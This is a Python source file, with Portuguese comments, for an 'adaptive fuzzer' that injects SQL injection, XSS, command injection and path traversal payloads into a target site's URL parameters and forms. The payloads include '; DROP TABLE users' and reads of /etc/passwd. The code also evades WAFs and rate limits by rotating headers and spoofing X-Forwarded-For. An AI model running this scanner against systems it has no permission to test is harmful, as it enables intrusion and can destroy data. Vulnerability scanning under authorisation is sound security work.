"""
AEGIS Bug Hunter - Fuzzer Adaptativo
Módulo de fuzzing inteligente e adaptativo
"""

import os
import json
import time
import random
import requests
import threading
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed

class AdaptiveFuzzer:
    def __init__(self, target_url, max_threads=5):
        self.target_url = target_url
        self.max_threads = max_threads
        self.session = requests.Session()
        self.resultados = []
        self.rate_limit_detected = False
        self.waf_detected = False
        self.delay_base = 0.5
        self.user_agents = self._gerar_user_agents()
        self.payloads_cache = {}
        
    def _gerar_user_agents(self):
        """Gera lista de user agents para rotação"""
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
        ]
    
    def _rotacionar_headers(self):
        """Rotaciona headers para evitar detecção"""
        return {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.5", "pt-BR,pt;q=0.8", "es-ES,es;q=0.7"]),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
    
    def _detectar_defesas(self, response):
        """Detecta WAF e rate limiting"""
        # Detecta rate limiting
        if response.status_code == 429:
            self.rate_limit_detected = True
            self.delay_base = min(self.delay_base * 2, 5.0)
            return "rate_limit"
        
        # Detecta WAF
        waf_indicators = [
            "cloudflare", "sucuri", "incapsula", "barracuda",
            "mod_security", "blocked", "forbidden", "access denied"
        ]
        
        response_text = response.text.lower()
        response_headers = str(response.headers).lower()
        
        for indicator in waf_indicators:
            if indicator in response_text or indicator in response_headers:
                self.waf_detected = True
                return "waf"
        
        return None
    
    def _adaptar_estrategia(self, defesa_detectada):
        """Adapta estratégia baseado na defesa detectada"""
        if defesa_detectada == "rate_limit":
            print(f"[fuzzer] 🛡️ Rate limiting detectado, aumentando delay para {self.delay_base}s")
            time.sleep(self.delay_base * 2)
        
        elif defesa_detectada == "waf":
            print(f"[fuzzer] 🛡️ WAF detectado, mudando para modo stealth")
            self.delay_base = max(self.delay_base, 2.0)
            # Adiciona headers para bypass
            self.session.headers.update({
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Originating-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            })
    
    def _gerar_payloads_evolutivos(self, tipo_base, resposta_anterior=None):
        """Gera payloads que evoluem baseado nas respostas"""
        if tipo_base not in self.payloads_cache:
            self.payloads_cache[tipo_base] = self._payloads_iniciais(tipo_base)
        
        payloads = self.payloads_cache[tipo_base].copy()
        
        # Evolui payloads baseado na resposta anterior
        if resposta_anterior:
            if "mysql" in resposta_anterior.lower():
                payloads.extend([
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "' UNION SELECT schema_name FROM information_schema.schemata--"
                ])
            elif "postgresql" in resposta_anterior.lower():
                payloads.extend([
                    "' AND (SELECT COUNT(*) FROM pg_tables)>0--",
                    "' UNION SELECT tablename FROM pg_tables--"
                ])
            elif "oracle" in resposta_anterior.lower():
                payloads.extend([
                    "' AND (SELECT COUNT(*) FROM user_tables)>0--",
                    "' UNION SELECT table_name FROM user_tables--"
                ])
        
        return payloads
    
    def _payloads_iniciais(self, tipo):
        """Retorna payloads iniciais por tipo"""
        payloads_map = {
            "sql": [
                "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
                "'; DROP TABLE users; --", "' UNION SELECT NULL--",
                "admin'--", "1' AND 1=1--", "1' AND 1=2--"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>"
            ],
            "command": [
                "; ls", "| whoami", "&& cat /etc/passwd",
                "; cat /etc/passwd", "`whoami`", "$(whoami)",
                "; ping -c 1 127.0.0.1"
            ],
            "lfi": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "/etc/passwd", "....//....//....//etc/passwd",
                "php://filter/read=convert.base64-encode/resource=index.php"
            ]
        }
        return payloads_map.get(tipo, [])
    
    def _analisar_resposta_inteligente(self, response, payload, tipo_payload):
        """Análise inteligente da resposta"""
        response_text = response.text.lower()
        response_headers = str(response.headers).lower()
        
        # Indicadores específicos por tipo
        indicadores = {
            "sql": [
                "sql syntax", "mysql_fetch", "ora-01756", "postgresql query failed",
                "warning: mysql", "syntax error", "database error"
            ],
            "xss": [
                payload.lower() in response_text,
                payload.lower() in response_headers
            ],
            "command": [
                "uid=", "gid=", "groups=", "root:", "/bin/bash",
                "command not found", "ping statistics"
            ],
            "lfi": [
                "root:x:", "daemon:", "# localhost", "127.0.0.1"
            ]
        }
        
        # Verifica indicadores
        if tipo_payload in indicadores:
            for indicador in indicadores[tipo_payload]:
                if isinstance(indicador, bool):
                    if indicador:
                        return {
                            "vulneravel": True,
                            "evidencia": "Payload refletido na resposta",
                            "confianca": 0.8
                        }
                elif isinstance(indicador, str):
                    if indicador in response_text or indicador in response_headers:
                        return {
                            "vulneravel": True,
                            "evidencia": f"Indicador encontrado: {indicador}",
                            "confianca": 0.9
                        }
        
        # Análise de timing (para blind injections)
        if hasattr(response, 'elapsed'):
            tempo_resposta = response.elapsed.total_seconds()
            if tempo_resposta > 5:  # Resposta muito lenta pode indicar time-based injection
                return {
                    "vulneravel": True,
                    "evidencia": f"Resposta lenta detectada: {tempo_resposta:.2f}s",
                    "confianca": 0.6
                }
        
        # Análise de mudanças no status code
        if response.status_code == 500:
            return {
                "vulneravel": True,
                "evidencia": "Erro interno do servidor",
                "confianca": 0.7
            }
        
        return {"vulneravel": False, "evidencia": None, "confianca": 0}
    
    def _fuzzer_parametros_url(self, tipos_payload=None):
        """Fuzzing de parâmetros na URL"""
        if tipos_payload is None:
            tipos_payload = ["sql", "xss", "command", "lfi"]
        
        parsed_url = urlparse(self.target_url)
        if not parsed_url.query:
            return []
        
        parametros = parse_qs(parsed_url.query)
        resultados = []
        
        print(f"[fuzzer] 🎯 Fuzzing {len(parametros)} parâmetros na URL")
        
        for param_name, param_values in parametros.items():
            for tipo in tipos_payload:
                payloads = self._gerar_payloads_evolutivos(tipo)
                
                for payload in payloads[:5]:  # Limita para não ser muito agressivo
                    try:
                        # Aplica delay adaptativo
                        time.sleep(random.uniform(self.delay_base, self.delay_base * 2))
                        
                        # Rotaciona headers
                        headers = self._rotacionar_headers()
                        
                        # Cria nova URL com payload
                        novos_params = parametros.copy()
                        novos_params[param_name] = [payload]
                        nova_query = urlencode(novos_params, doseq=True)
                        nova_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{nova_query}"
                        
                        # Faz requisição
                        response = self.session.get(nova_url, headers=headers, timeout=10)
                        
                        # Detecta defesas
                        defesa = self._detectar_defesas(response)
                        if defesa:
                            self._adaptar_estrategia(defesa)
                            continue
                        
                        # Analisa resposta
                        analise = self._analisar_resposta_inteligente(response, payload, tipo)
                        
                        if analise["vulneravel"]:
                            resultado = {
                                "tipo": "parametro_url",
                                "parametro": param_name,
                                "payload": payload,
                                "tipo_payload": tipo,
                                "url_teste": nova_url,
                                "status_code": response.status_code,
                                "evidencia": analise["evidencia"],
                                "confianca": analise["confianca"],
                                "timestamp": datetime.now().isoformat()
                            }
                            resultados.append(resultado)
                            print(f"[fuzzer] 🚨 Possível {tipo} em {param_name} (confiança: {analise['confianca']:.1%})")
                            
                            # Evolui payloads baseado no sucesso
                            self.payloads_cache[tipo] = self._gerar_payloads_evolutivos(tipo, response.text)
                    
                    except Exception as e:
                        continue
        
        return resultados
    
    def _fuzzer_formularios(self, formularios, tipos_payload=None):
        """Fuzzing de formulários"""
        if tipos_payload is None:
            tipos_payload = ["sql", "xss", "command"]
        
        resultados = []
        
        print(f"[fuzzer] 📝 Fuzzing {len(formularios)} formulários")
        
        for form in formularios:
            if not form.get("url_completa") or not form.get("campos"):
                continue
            
            for tipo in tipos_payload:
                payloads = self._gerar_payloads_evolutivos(tipo)
                
                for payload in payloads[:3]:  # Limita payloads por formulário
                    try:
                        time.sleep(random.uniform(self.delay_base, self.delay_base * 2))
                        headers = self._rotacionar_headers()
                        
                        # Prepara dados do formulário
                        form_data = {}
                        for campo in form["campos"]:
                            if campo.get("name"):
                                if campo.get("type") == "hidden":
                                    form_data[campo["name"]] = campo.get("value", "")
                                else:
                                    form_data[campo["name"]] = payload
                        
                        # Faz requisição
                        if form["method"] == "POST":
                            response = self.session.post(form["url_completa"], data=form_data, headers=headers, timeout=10)
                        else:
                            response = self.session.get(form["url_completa"], params=form_data, headers=headers, timeout=10)
                        
                        # Detecta defesas
                        defesa = self._detectar_defesas(response)
                        if defesa:
                            self._adaptar_estrategia(defesa)
                            continue
                        
                        # Analisa resposta
                        analise = self._analisar_resposta_inteligente(response, payload, tipo)
                        
                        if analise["vulneravel"]:
                            resultado = {
                                "tipo": "formulario",
                                "form_action": form["url_completa"],
                                "form_method": form["method"],
                                "payload": payload,
                                "tipo_payload": tipo,
                                "status_code": response.status_code,
                                "evidencia": analise["evidencia"],
                                "confianca": analise["confianca"],
                                "timestamp": datetime.now().isoformat()
                            }
                            resultados.append(resultado)
                            print(f"[fuzzer] 🚨 Possível {tipo} em formulário (confiança: {analise['confianca']:.1%})")
                    
                    except Exception as e:
                        continue
        
        return resultados
    
    def executar_fuzzing_completo(self, formularios=None):
        """Executa fuzzing completo com threading"""
        print(f"[fuzzer] 🚀 Iniciando fuzzing adaptativo em {self.target_url}")
        
        resultados_finais = []
        
        # Fuzzing de parâmetros URL
        resultados_url = self._fuzzer_parametros_url()
        resultados_finais.extend(resultados_url)
        
        # Fuzzing de formulários se disponível
        if formularios:
            resultados_forms = self._fuzzer_formularios(formularios)
            resultados_finais.extend(resultados_forms)
        
        print(f"[fuzzer] ✅ Fuzzing concluído: {len(resultados_finais)} possíveis vulnerabilidades")
        
        return {
            "target_url": self.target_url,
            "timestamp": datetime.now().isoformat(),
            "configuracao": {
                "max_threads": self.max_threads,
                "delay_base": self.delay_base,
                "waf_detected": self.waf_detected,
                "rate_limit_detected": self.rate_limit_detected
            },
            "vulnerabilidades": resultados_finais,
            "estatisticas": {
                "total_vulnerabilidades": len(resultados_finais),
                "tipos_encontrados": list(set([v["tipo_payload"] for v in resultados_finais])),
                "confianca_media": sum([v["confianca"] for v in resultados_finais]) / len(resultados_finais) if resultados_finais else 0
            }
        }

def executar(target_url):
    """Executa fuzzer adaptativo"""
    print(f"[fuzzer] 🧪 Iniciando fuzzer adaptativo para: {target_url}")
    
    try:
        # Carrega dados do parser se disponível
        site_name = target_url.replace('https://', '').replace('http://', '').replace('/', '_')
        parser_file = f"output/{site_name}/parser.json"
        formularios = []
        
        if os.path.exists(parser_file):
            with open(parser_file, 'r', encoding='utf-8') as f:
                parser_data = json.load(f)
                formularios = parser_data.get("formularios", [])
        
        # Cria e executa fuzzer
        fuzzer = AdaptiveFuzzer(target_url)
        resultado = fuzzer.executar_fuzzing_completo(formularios)
        
        # Salva resultado
        output_dir = f"output/{site_name}"
        os.makedirs(output_dir, exist_ok=True)
        
        arquivo_saida = f"{output_dir}/fuzzer_results.json"
        with open(arquivo_saida, "w", encoding="utf-8") as f:
            json.dump(resultado, f, indent=4, ensure_ascii=False)
        
        print(f"[fuzzer] ✅ Fuzzing concluído")
        print(f"[fuzzer] 🎯 Vulnerabilidades encontradas: {resultado['estatisticas']['total_vulnerabilidades']}")
        print(f"[fuzzer] 📊 Confiança média: {resultado['estatisticas']['confianca_media']:.1%}")
        print(f"[fuzzer] 💾 Resultado salvo em: {arquivo_saida}")
        
        return resultado
        
    except Exception as e:
        print(f"[fuzzer] ❌ Erro durante fuzzing: {str(e)}")
        return {"erro": str(e)}

